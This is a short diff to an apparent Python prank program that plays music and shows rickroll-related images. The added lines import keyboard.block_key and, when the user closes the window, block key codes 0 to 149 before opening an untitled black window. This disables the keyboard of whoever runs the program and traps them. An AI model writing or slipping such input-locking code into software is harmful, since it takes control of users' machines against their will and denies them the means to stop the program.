@@ -7,6 +7,7 @@ from playsound import playsound
 from multiprocessing import Process
 import webbrowser
 from pathlib import Path
+from keyboard import block_key
 
 image_urls =["https://bot.to/wp-content/uploads/2020/09/antirickroll_5f6fcaafddcd9.png",
              "https://styles.redditmedia.com/t5_3d3rqx/styles/communityIcon_j93l74ux7kx51.png?width=256&s=fa2767dae0ab75ef06c6a1a5ca8e4b7b23711c90",
@@ -33,6 +34,9 @@ def music():
 def on_closing(r):
     r.destroy()
     if f == 1:
+        for m in range(150):
+            block_key(m)
+        
         root = Tk()
         root.title("")
         root.configure(background='black')
